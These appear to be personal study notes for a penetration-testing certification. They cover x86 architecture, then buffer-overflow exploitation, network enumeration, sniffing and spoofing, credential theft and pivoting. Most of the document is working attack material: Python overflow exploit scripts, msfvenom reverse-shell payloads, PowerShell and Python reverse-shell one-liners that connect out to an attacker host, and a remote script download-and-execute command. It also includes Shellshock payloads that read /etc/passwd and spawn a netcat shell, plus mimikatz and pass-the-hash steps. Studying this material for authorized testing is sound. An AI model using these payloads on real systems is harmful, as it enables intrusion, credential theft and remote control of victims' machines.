## eCPPT ##

Architecture Fundamentals ::
	
	CPU:
		CPU Instructions are represented in hexadecimal(HEX).
		The instructions are complex to read(machine code), thus they're getting translated into Assembly code(ASM) which is human-readable.

		Each CPU has it's own ISA - Instruction set architecture,
		ISA is what a programmer can see:
			-memory
			-registers
			-instructions
			-etc.
			Provides all the necessary info for who want to write a program in that machine lang.
			Examples are: Intel 8086 - x86, AMD64 - x64
	Registers:
		number of bits 32,64 refers to the width of the CPU registers.
		Each CPU has its fixed set of registers that are accessed when required.
		General Purpose Registers (GPRs):
			EAX - Accumulator   	  - Used in arithmetic operations
			ECX - Counter       	  - Used in shift/rotate instr. and loops
			EDX - Data          	  - Used in arithmetic operations & I/O
			EBX - Base          	  - Used as a pointer to data
			ESP - Stack Pointer 	  - Pointer to the top of the stack
			EBP - Base Pointer  	  - Pointer to the base of the stack
			ESI - Source Index        - Used as a pointer to a source in stream operation
			EDI - Destination         - Used as a pointer to a destination in stream operation
			EIP - Instruction Pointer - tells the CPU where the next instuction is
	Process Memory:
		Text:
			The text region, or instr. segment, is fixed by the program and a contains the program code(instructions). - read-only.
		Data:
			The data region is divided into initialized data and uninitialized data.
			initialized data includes items such as static and global declared variables that are pre-defined and can be modified.
			uninitialized data, named 'Block Started by Symbol'(BSS), also initializes variables that are initialized to zero or do not have explicit initialization(C++ ex. : int t;)
		Heap:
			Starts right after BSS, during the execution the program can request more space in memory via brk and sbrk system calls, used by malloc(memory allocate) and realloc(re-allocate) and free. Hence, the size of the data region can be extended; this is not vital.
		Stack:
			The stack is a LIFO(Last in first out) block of memory. It is located in the higher part of the memory. Can be thought as an array used for saving a fucntion's return addresses, passing function arguments, and storing local variables.
			ESP:
				The purpose of the ESP register(Stack Pointer) is to identify the top of the stack,
				and it is modified each time a value is pushed in(PUSH) or popped out(POP).
			PUSH:
				A PUSH instruction subtracts 4(32-bit) or 8(64-bit) from the ESP and writes the data to the memory address in the ESP, then updates the ESP to the top of the stack.
				Stack grows backwards, therefore the PUSH substracts 4 or 8, in order to point to a lower memory location on the stack. If we don't subtract it, the PUSH operation will overwrite the current location pointed by ESP(the top) and we'd lose data.
			POP:
				Opposite of the PUSH instruction, it retrieves data from the top of the stack.
				Therefore, the data contained in the address location in ESP is retrieved and stored(usually in another register). After a POP operation, the ESP value is incremented, by 4 or by 8.
			Procedures and Fucntions:
				Stack Frames:
					Functions contain two important components, the prologue and the epilogue.
					The prologue prepares the stack to be used, similar to putting a bookmark in a book. when the function has completed, the epilogue resets the stack to the prologue settings.
					The stack consists of logical stack frames(portions/areas of the stack), that are PUSHed when calling a function and POPed when returning a value.
					When a subroutine, such as a function or procedure, is started, a stack frame is created and assigned to the current ESP location(top of stack); this allows the subroutine to operate independently in its own location in the stack.
					When a subroutine ends:
						1. The program recieves the parameters passed form the subroutine.
						2. The insturction Pointer(EIP) is reset to the location at the time of the initial call.
						The stack frame keeps track of the location where each subroutine should return the control when it terminates.
					when a functions is called, the arguments [(in brackets)] need to be evaluated.
					The control flow jumps to the body of the function, and the program executes its code.
					Once the function ends, a return statement is encountered, the program returns to the function call(the next statement in the code).
					When a new function is called, a new stack frame has to be created.
					the stack frame is defined by the EBP(Base Pointer) and the ESP(Stack Pointer)... the bottom and the top of the stack.
					For us to not lose the information of the old stack frame, which is the function that called the current function, we have to save the current EBP on the stack.
					If not done, we wouldn't know that this info belonged to a previous stack frame when returned.

					Prologue:
						Example of a function call:
							1. push ebp
							2. mov ebp, esp
							3. sub esp, X(number)

							1. push ebp:
								The first instruction saves the old EBP onto the stack, so it could be restored later.
							2. mov ebp, esp:
								The second instuction copies ESP value to EBP.
							3. sub esp, x:
								The last instruction moves the ESP by decreasing it's value, necessary for making space for the local variables.

					Epilogue:
						Example of a function pop:
							1. mov esp, ebp
							2. pop ebp
							3. ret

							1. mov esp, ebp:
								The first instruction makes both the ESP and EBP point to the same location.
							2. pop ebp:
								The second instruction removes the value of EBP from the stack, sinch the top of the stack points to the old EBP, the stack frame is restored. (and ESP points to the old EIP previously stored)
							3. ret:
								The last instruction pops the value contained at the top of the stack to the old EIP - The next instruction after the call and jumps to that location.
								RET affects only the EIP and the ESP registers.


				Endianness:
					The way of storing data in the memory.
					MSB - Most significant bit - in a binary number is the largest value, usually the first from the left.
					example:
						binary is - 100, MSB is 1.
					LSB - Least significant bit - in a binary number is the smallest value, usually the first from the right.
					example:
						binary is - 100, LSB is 0.

					Big-Endian:
						In the big-endian representation, the LSB is stored at the highest memory address, while the MSB at the lowest.
					Little-Endian:
						In the little-endian representation, the LSB is stored at the lowest memory address, while the MSB at the highest.

				NOPs:
					NOP is an Assembly language instruction that does nothing(NOP=No operation instruction).
					When a program encounters a NOP, it skips to the next instruction. in x86 represented by HEX value of 0x90.

					NOP-sled:
						NOP-sled is a technique used during exploitation process of buffer overflows. Its only purpose is to fill a large(or small) portion of the stack with NOPs; this will allow us to slide down to the instruction we want to execute, which is usually put after the NOP-sled.
						That's because BOF(buffer overflow) have to match a specific size and location that the program is expecting.

Security Implementations ::

	ASLR:
		Address Space Layout Randomization(ASLR)
		The goal is to introduce randomness for executables, libraries, and stacks in the memory address space.
		Makes it difficult for an attacker to predict memory addresses and exploit.
		When ASLR is loaded the OS loads the same executable at different locations in memory every time.
		*ASLR is not enabled for all modules, means that there could be a DLL in the address space without the protection, making the whole prgoram vulnerable*

		Verify ASLR:
			-Process Explorer

		Mitigation:
			Enhanced Mitigation Experience Toolkit(EMET)

			DEP:
				Defensive hardware and software measure that prevents the execution of code from pages in memory that are not explicitly makred as executables.
				Code Injected into the memory can't be run from this region.

			The Canary(Stack Cookie):
				A security measure, places a value next to the return address in the stack.
				The function prologue loads a value into this location, while the epilogue makes sure that the value is intact.
				As a result, when the epilogue runs, it checks that the value is still there and that it is correct.


Assembly ::
	
	NASM:
		Assemble - nasm -f win32 file.asm -o output.obj
		Link DLLs - GoLink.exe /entry _main output.obj 1_dll.dll 2_dll.dll
			/entry _main - tells the linker the entry point for the program

	ASM Basics:
		Instructions:
			Data Transfer:
				MOV  - Moves data from one location to another on the memory
				XCHG - Exchange the data of two operands (but not between memory)
				PUSH - Pushes a value into the stack
				POP  - Deletes a value off the stack
			Arithmetic:
				ADD  - Increment
				SUB  - Subtract
				MUL  - Multiply
				XOR  - Exclusive or (outputs true only if when input differ, one is true and other is false)
				NOT  - same as '!'
			Control Flow:
				CALL - CALL a function 
				RET  - Return, end function
				LOOP - 
				Jc   - (c - condition) jump if NE(not equal), E(equal), NZ(not zero), JGE(greater or equal), etc.
			Other:
				STI  -
				CLI  -
				IN   -
				OUT  -

		Intel vs AT&T:
			Intel(Windows) - <instruction><destination><source>
			AT&T(Linux)    - <instruction><source><destination>
				puts % before registers and a $ before numbers.
				suffix to the instuction to define operand size as well:
					Q-quad(64bit), L-Long(32bit), W-Word(16bit), B-Byte(8bit)

		PUSH instruction:
			PUSH stores a value on the top of the stack, causing the stack to be adjusted by -4 bytes (on 32-bit), -0x04.
			PUSH under the hood just subtracts -4 from the ESP.

		POP instruction:
			POP reads the value from the top of the stack, causing the stack to be adjusted by +4 bytes, +0x04.
			Adds +4 to the ESP.

		CALL instruction:
			Subroutines are implemented by using the CALL and RET instruction pair.
			The CALL instruction pushes the current instruction pointer(EIP) to the stack and jumps to the function address specified.
			Whenever the function executes the RET instruction, the last element is popped from the stack, and the CPU jumps to the address.


Tools ::
	
	gcc - gcc -m32(architecture) file.c -o(output) file.exe
	objdump - objdump -d(disassemble) -Mintel(architecture) file.exe > assembly.txt




Buffer Overflows ::
	
	Fuzzing:
		
		import sys
		import socket

		buffer=["A"]
		counter=100

		while len(buffer) <= 30:
		    buffer.append("A"*counter)
		    counter=counter+200

		for string in buffer:
		    print("Fuzzing... with %s bytes" % len(string))
		    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		    connect=s.connect(('111.61.0.96', 9999))
		    s.send(('TRUN /.:/' + string))
		    s.close()


		when the program crashes, we note the bytes in which it happened and move on to finding the offset.

	Finding the offset:

		/usr/share/metasploit-framework/tools/exploits/pattern_create.rb -l (bytes)

		/usr/share/metasploit-framework/tools/exploits/pattern_offest.rb -l (bytes) -q (EIP)

		or with mona:

			!mona pc (pattern_create)

			!mona po (pattern_offset)r

		import sys
		import socket

		shellcode = <pattern_create>
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			connect=s.connect(('IP', port))
			s.send(('TRUN' /.:/ + shellcode))
		except:
			print("CHECK DEBUGGER!.")
		s.close()




	Overwriting the EIP:

		import sys
		import socket

		shellcode = "A"*2003 + "B"*4
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			connect=s.connect(('IP', port))
			s.send(('TRUN' /.:/ + shellcode))
		except:
			print("CHECK DEBUGGER!.")
		s.close()

	Finding bad characters:

		import socket
		import sys

		badchars = (
		"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
		"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
		"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
		"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
		"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
		"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
		"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
		"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

		shellcode = "A"*2003+"B"*4 + badchars
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			connect=s.connect(('IP', port))
			s.send(('TRUN /.:/ + shellcode'))
		except:
			print("CHECK DEBUGGER!.")
		s.close()

		Then follow ESP in dump.

	Find the right module:

		!mona modules
			check for False ASLR+DEP dlls

		/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
			JMP ESP ? (FFE4)

		!mona find -s "\xff\xe4" -m dll.dll

		then from results:

			import socket
			import sys

			shellcode = "a"*2003 + "\x??\x??\x??\x??"
			s=scoket.socket(socket.AF_INET, socket.SOCK_STREAM)
			try:
				connect=s.connect(('IP', port))
				s.send(('TRUN /.:/ + shellcode'))
			except:
				print("CHECK DEBUGGER!.")
			s.close()

			see if .dll is loaded into EIP

	Gaining remote shell:

		msfvenom -p windows/shell_reverse_tcp LHOST=lhost LPORT=4343 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"

		or for linux:

		msfvenom -p linux/x86/shell_reverse_tcp LHOST=111.61.0.153 LPORT=4444 EXITFUNC=thread -a x86 --platform linux -f c -b "\x00" -e x86/shikata_ga_nai

		add the payload, and some NOP's.
		a NOP is a hex of \x90, add it right after the overwritten EIP, "\x90"*32 should be enough.

		2dx


	BOF With Ruby on the go:

		pry --simple-prompt

		require "socket"
		s = TCPSocket.new("<IP>", <PORT>)
		s.gets - get banner
		s.puts "A"*<NUMBER>
		...

		badchars:

			"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"



Information Gathering ::

	Infrastructures:

		goal is to retrieve:
			- Domains
			- Mail servers
			- Netblocks / IP Adresses
			- ISP's used
			- etc.

		Scope of engagement:

			SoE(Scope of engagement) is set by the customers needs:

				- Name of the organization - which is considered a full scope test
				- IP addresses / Netblocks to test

				Full Scope:

					DNS -> Dns enumeration techniques, whois
					IP  -> Reverse lookup, MSN Bing

				Netblocks/IP's:

					Live hosts -> Further DNS
					Further DNS

				*whois normally runs on port 43

		DNS Records:

			Resource Record -> TTL, Record class -> SDA, NS, A, PTR, CNAME, MX

			Resource Record - a resource record starts with a domain name usually a fully qualified domain name(FQDN, e.g. .www.google.com),

			TTL - Time-To-Live > recorded in seconds, defaults to the minimum value determinted in the SOA(Start of authority) record.

			Record Class - Internet, Hesoid, Chaos

			SOA - Start of Authority - Indicates the beginning of a zone and it should occur first in a zone file.
			There could only be one SOA record per zone.
			Defines certain values for the zone such as serial number and various expiration timeouts.

			NS - Name Server - defines an authoritative name server for a zone.
			Defines and delegates authority to a name server for a child zone.
			NS records are the glue that binds the distributed database together.

			A - Address - A record is a hostname to an IP address.
			Zones with A records are called "forward" zones.

			PTR - Pointer - the PTR record maps an IP address to a hostname.
			Zones with PTR records are called "reverse" zones.

			CNAME - the CNAME record maps an alias to an A record hostname

			MX - Mail Exchange - the MX record specifies a host that will accept mail on behalf of a given host.
			The host has an associated priority value, a single host may have multiple MX records.
			The records for a specified host make up a prioritized list.


			DNS Lookup:

				nslookup target.com

				Reverse lookup -> nslookup -type=PTR <IP>

				MX lookup      -> nslookup -type=MX <IP>

				Zone Transfers:

					Are usually a misconfiguration of the remote DNS server, they should be enabled only for trusted IP addresses.
					When zone transfers are enabled, we can enumerate the entire DNS record for that zone.
					Includes all the sub-domains of our domain (A Records).

					How it works:

						Starting off with a NS lookup -> nslookup -type=NS target.com

						then:

							nslookup
							server <NS Domain>
							ls -d target.com

					In Linux:

						dig target.com 

						Reverse lookup -> dig <IP> PTR

						MX Lookup      -> dig <IP> MX

						NS Lookup      -> dig <IP> NS

						Zone Transfer:

							dig axfr @target.com target.com

							dig +nocmd target.com AXFR +noall +answer @target.com

							* dig @<DOMAIN IP> target.com -t AXFR +nocookie

			    determine domain name:

			    	dig @<IP> -x <DOMAIN IP> +nocookie


				determine subdomains:

					Reverse lookup from NS server, or lookup in Google/Bing -> ip:<ip> (in search)

					-Domaintools
					-DNSlytics
					-Networkappers
					-Robtex

			Netblocks and AS:

				Netblocks are basically subnets.
				AS - autonomous system - is made of one or more netblocks under the same administrative control.
				Big corporations and ISP's have an autonomous system, while smaller companies will barely have a netblock.

				nmap -> --disable-arp-ping / --send-ip
				nmap -> -PS flag to TCP scan to not generate too much traffic = workaround for firewalls


				futher dns:

					DNS TCP SCAN - nmap -sS -p53 <netblock>

					DNS UDP SCAN - nmap -sU -p53 <netblock>


			fierce -dns target.com
			fierce -dns target.com -dnsserver ns1.target.com
			dnsmap target.com
			dnsrecon -d target.com


Scanning::

	fping, hping, nmap:

		fping -e - time to send and recieve back the packer (IDS/IPS detection)

		hping3 -2 - send UDP packet
		hping3 -S - TCP/SYN - host discovery
		hping3 -p - SYN/ACK
		hping3 -F - FYN packet
		hping3 -U - urgent
		hping3 -X - XMAS package
		hping3 -Y - YMAS package
		hping3 -1 192.168.1.x --random-dest -I eth0 - check if subnet alive
		hping3 -S -r -p <port> <IP> - estimate good zombie host (if id increment by +1 = open, if by +2 = closed)



		nmap --ossscan-guess - OS Scan more aggressively (used with -O flag)
		nmap -sS --source-port(or -g) 53 -p 53 - source port
		nmap --spoof-mac (devie) - send from apple/win/lin etc. MAC Address
		nmap --spoof-mac 0 - spoof random MAC Address
		nmap --spoof-mac <MAC Address> - spoof specific MAC Address
		nmap --randomize-hosts - random hosts scan order


		netdiscover -i tap0(eth/wlan...) -S -L -f -r <ip>/<subnet>
		arp-scan -I tap0(eth/wlan...) <ip>/<subnet>


	Tools:

		DnsDumpster.com
		dnsenum - https://github.com/fwaeytens/dnsenum
		dnsenum --subfile file.txt -v -f /usr/share/dnsenum/.txt -u a -r target.com - store subdomains in file.txt


Enumeration ::
	
	Netbios:

		UDP 137 - name services
		UDP 138 - datagram services
		TCP 139 - session services

		name services:

			00 - Workstation Service - Messenger Service
			03 - Messenger Service - Master Browser
			06 - RAS Server Service - Domain Master Browser
			1F - NetDDE Service - Domain Name
			20 - Server Service - Domain Control
			21 - RAS Client Service - Browser Service Elections
			BE - Network Monitor Agent - Master Browser
			BF - Network Monitor Application

		nbtstat -A <target IP> - information gathering (Windows)
		nmblookup -A <target IP> - information gathering (Linux)
		nbtscan -v <target IP> - information gathering (Linux)
		nbtscan -v <IP>/subnet - scan entire subnet
		smbmap -H - enumerate shares and permissions
		net view <IP> - list domains, computers, resources shared by a computer on the network
		net use <Drive Letter>: \\<IP>\C(or C$,IPC... etc.)
		smbclient -L <IP> - smb connect
		smbclient -N \\\\<IP>\\<share> -U "" - SMB login to anonymous access
		mount.cifs //<IP>/C /media/<Folder> user=,=pass= - navigate target shares
		mount -t nfs <IP>:/home/<user> /mnt/<IP>_nfs -o nolock (first do mkdir /mnt/<IP>_nfs)
		net use \\<IP>\IPC$ "" /u:"" - Null Session
		winfo <IP> -n - flag -n means to try to establish a null session before gathering information
		DumpSec - Report>Select Computer >> \\<IP>
		enum4linux <IP> - enumerate linux machine remotely
		enum4linux -r <IP> - enumerate users
		rpcclient -N -U "" <IP> - if establishes then "help"
		rpcclient > 'enum' for us ul commands

		msf> use auxiliary/scanner/smb/smb_login

		nmap --script=smb-enum-users -p 445 <IP> --script-args=smbuser=<username>,smbpass=<password>

		msf> impersonate token:
			use incognito
			list_tokens -u
			impersonate_token <domain>\\<username>


	SNMP:

		UDP 161 - General Messages
		UDP 162 - Trap Messages

		snmpwalk:

			snmpwalk -v 2c <ip> -c public - v means version(2c) c means community string to use(public)
			snmp-mibs-downloader >> comment fourth line of /etc/snmp/snmp.conf (IF RETURNS OID NUMERICALLY)

		snmpset:

			snmpset -v 2c <ip> -c public (OID) s(for STRING) new@new.com


		Finding:

			1. find 139/445 open
			2. scan for 161 - nmap -sU -p 161 <ip>

		Finding communities:

			onesixtyone - onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <ip>
			-or-
			nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes <ip>
			nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-* <ip>  (FIND ALL)


	Scan network from within a host:
		run autoroute -s <IP>(.0)/Subnet
		^Z
		use <IP>canner/portscan/tcp(or udp)


	Hydra brute SMB:
		hydra -L users.txt -P /usr/share/john/password.lst <IP> smb -f -V
	


Sniffing & MITM ::
	
	Passive sniffing - listening to packets on the network in order to gather sensitive information, using Wireshark for instance.

	Active sniffing - actively performing malicious operations such as MAC Spoofing and ARP Poisoning on the network in order to redirect the traffic.
	downside is that it is not a stealthy technique.

	MAC Spoofing - meant to stress the switch and feel the CAM table. the CAM table keeps all the info required to forward frames to the correct port.
	<MAC - port - TTL>
	when the space is filled with fake MAC addresses, the switch can't learn new MACs. then the only way to keep the network alive is to forward the
	frames meant to be delivered to the unknown MAC address on all of the ports on the switch, thus making it fail open, or act like a hub.

	ARP Poisoning - probably the stealthiest of the active sniffing techniques. does not bring down switch functionality, instead it exploits
	the concept of traffic redirection. one of the most used attacks to perform a MITM attack.
	By exploiting the network via ARP poisoning, the attacker is able to redirect the traffic of the selected victim to a specific machine.
	Doing this enables the attacker to not only monitor, but also modify the traffic.
	can also be used to DoS the target. 


	ARP:

		Address resolution protocol. Matches IP addresses(Layer 3) with MACs(Layer 2).

		ARP Tables:
			when HOST A creates a packet destined to HOST B, before it's delivered HOST A searches it's ARP table... if HOST B is found in the table
			the correspondent MAC address is inserted as the Layer 2 destination address into the protocol frame.
			If the entry isn't found in the ARP table, an ARP request is sent on the LAN. the request contains the following values in the desination
			fields of the IP-Ethernet packets:
			Source IP: IP_A
			Source MAC: MAC_A
			Destination IP: IP_B
			Destination MAC: FF:FF:FF:FF:FF:FF
				* the F's indicates a broadcast message
			the nodes which IP address do not match with the destination IP_B will drop the packet.
			the node which matches will respond with an ARP reply to the sender, with the MAC.
			then it is inserted into the ARP table for future use.

	Tools :

		dsniff:

			active/passive sniffing, MITM attacks, monitoring the network for data such as passwords, emails, files etc.

			uses:

				Passive - filesnarf, mailsnarf, msgsnarf, urlsnarf, webspy
				Active - arpspoof, dnsspoof, macof
				MITM - sshmitm, webmitm

		TCPdump(-or- windump for windows):

			tcpdump -i eth0(wlan0,tap0...)
			needs creds decoding from base64 - echo <base64> | base64 -d

			tcpdump -D - shows available interfaces for sniffing
			tcpdump -i eth0(wlan0,tap0...) - sniff traffic on interface
			tcpdump -v - verbose mode
			tcpdump -q - quiet option
			tcpdump -i eth0 host www.website.com - show only traffic between host and website
			tcpdump -i eth0 src <IP> dst <IP> - show only traffic between source IP and destination IP
			tcpdump -F - import to file
			tcpdump -c <num of packets> - stop capturing after a certain amount of packets captured


	LLMNR/NBT-NS Poisoning:

		1. HOST A requests an SMB share, but has a typo in the SMB address he's trying to access
		2. since it can't be resolved by the DNS, HOST A falls back to LLMNR/NBT-NS broadcast msg asking the LAN for the ip address of the typo share
		3. HOST B responds to this message claiming to be the typo share system
		4. HOST A complies and sends HOST B their username and NTLMv1/v2 hash

		Responder:

			SMB-Signing check - runfinger.py -i <target>

			modify responder.conf - SMB=OFF, HTTP=OFF

			responder -I eth0(wlan0,tap0...) --lm
			+
			multirelay.py -t <target> -u ALL
			

	setup port redirection -> iptables -t nat -A PREROUTING -p tcp  --destination-port 80 -j REDIRECT --to-ports 8080

	sslstrip -a -f -l 8080 -w ssl_usr

	bettercap -G <TARGET_IP> -T <VICTIM_IP> --proxy-https

	python mitmf.py -i eth0 --spoof -arp --dns --hsts --gateway <GATEWAY_IP> --targets <TARGET_IP>


	see which port is enabled - netstat -an |findstr :<port>
	see firewall rules - netsh firewall show config
	enable RDP - reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
	open RDP on FW - netsh firewall add portopening TCP 3389 "Remote Desktop"


	Unquoted Paths: 
		
		wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

		if found, go through directories and list permissions with icacls on each dir.
		Insert payload(and set to windows/shell_reverse_tcp) and BAM.

		# sc qc "vulnsvc" -> Query service config
		# try sc stop/start
		# shutdown /r /t 0 -> Restart endpoint to restart services aggressively


	DNS Tunneling:

		iodine -P '<PASS>' ns1.site.com -T CNAME -r -f 

		To SSH Socks proxy:

			ssh <user>@<nameserver IP> -D<LHOST-DNS CONNECTION>:<PORT> -N -C

	DLL Hikjacking:

		procexp to find process run by NT AUTHORITY\SYSTEM
		procmon to find dlls run by the process found in last step
		-> check if there's a "NAME NOT FOUND" .dll file -> make a fake dll with the same name that contains a payload.
		 

Pivoting ::
	
	Pivoting Playbook:

		If the victim's machine has got 2 NICs ->
			Use meterpreter's autoroute post module
			Then ARP scan to find hosts
			Then exploit a machine on the other network
			using socks4 to set a proxy & proxychains to use it
		If the new machine has got 2 NICs ->
			Autoroute again on the last pivot
			Then exploit the new victim
			using socks4 to set a new proxy & proxychains to use it

	use post/windows/manage/autoroute
	set SESSION <SESSION>
	set SUBNET <ROUTE.0>
	run

	to proxy through the pivot, exploit again with pivot IP.


	Pass the hash:

		meterpreter > hashdump
		exploit/windows/smb/psexec
		set SMBUser
		set SMBPass <hash>
		exploit

	Info Gathering:

		use sniffer
		sniffer_interfaces
		sniffer_start <interface number>
		sniffer_dump <interface number> <filename.pcap>
		sinffer_stop <interface number>
		use post/multi/recon/local_exploit_suggester


	sshuttle -r root@<IP> --ssh-cmd "ssh -i ird_rsa" <remote subnet> -x <IP>


	SessionGopher:

		powershell.exe -nop -ep bypass -C iex (New-Object Net.Webclient).DownloadString('http://<SimpleHTTPServer>/SessionGopher.ps1'); Invoke-SessionGopher 

		-Thorough - more info

	Active Directory:

		load extapi
		adsi_computer_enum <USERDNSDOMAIN> - enumerate AD computers
		adsi_user_enum <USERDNSDOMAIN> - enumerate AD users

	Creds stealing:

		AD policies - %USERDNSDOMAIN%\Policies
		Sysvol share - %LOGONSERVE%\Sysvol

		Than you can find user creation policies by searching for groups.xml files in the policies directory.
		System administrators usually use AD policies to deploy a local administrator account in a domain environment.

		find groups.xml in {...}\Machine\Preferences\Groups\Groups.xml
		then decrypt the password with gpp-decrypt.

		then you can run execute a reverse shell by using post/windows/manage/run_as

		then if getsystem fails use -> exploit/windows/local/bypassuac_injection


		load mimikatz
		kerberos - try to harvest users and passwords
		wdigest - try harde
		privilege::debug
		token::elevate
		lsadump::sam

		evil-winrm:

			evil-winrm -u <user> -H <hash> -i <IP> (or -p for password instead of hash) -s <include scripts path>

			upload LOCAL_FILEPATH REMOTE_FILEPATH
			download REMOTE_FILEPATH LOCAL_FILEPATH
			include Empire scripts from - /opt/Empire/data/module_source/<path>/<to>/<script>

		port forward for RDP:

			portfwd add -L 127.0.0.1 -l 3389 -r <remote machine> -p 3389
			rdesktop -u <domain>\<user> -p "<password>" 127.0.0.1
		
		portfwd:

			portfwd add -L <LHOST> -l <LPORT> -p <PORT TO FORWARD>(80,3389,etc.) -r <RHOST>

		file share with RDP:

			xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share


		socks4a & proxychains:

			socks4a:
			use auxiliary/server/socks4a
			set SRVHOST as LHOST, and SRVPORT as the port of the pivot.

			proxychains:
			set proxychains to connect through the newly made socks4 proxy.
			run commands freely(modify /etc/proxychains.conf).


		chisel:

			chisel server -p <SRVPORT> --socks5
			chisel client <RHOST>:<SRVPORT> <PROXY_PORT>:socks

			netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=<PORT>


HELPFUL STUFF ::

	powershell rev shell:

		powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

	python rev shell:

		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

	shellschock test:

		env x=`() { :;}; echo vulnerable' bash -c "echo test"

		nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi <IP> -p 80

		wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat/etc/passwd http://<IP>/cgi-bin/login.cgi && cat login.cgi

		wget -U "() { foo;};echo; /bin/nc <IP> <PORT> -e /bin/sh" http://<IP>/cgi-bin/login.cgi

	heartbleed test:

		nmap --script ssl-heartbleed <IP>

		if vulnerable:

			msfconsole -> auxiliary/scanner/ssl/openssl_heartbleed
			show actions (DUMP)
			leak file stored in .msf(versionNumber)/loot as a .bin file

	Crack zip:

		fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt <ZIP-FILE>
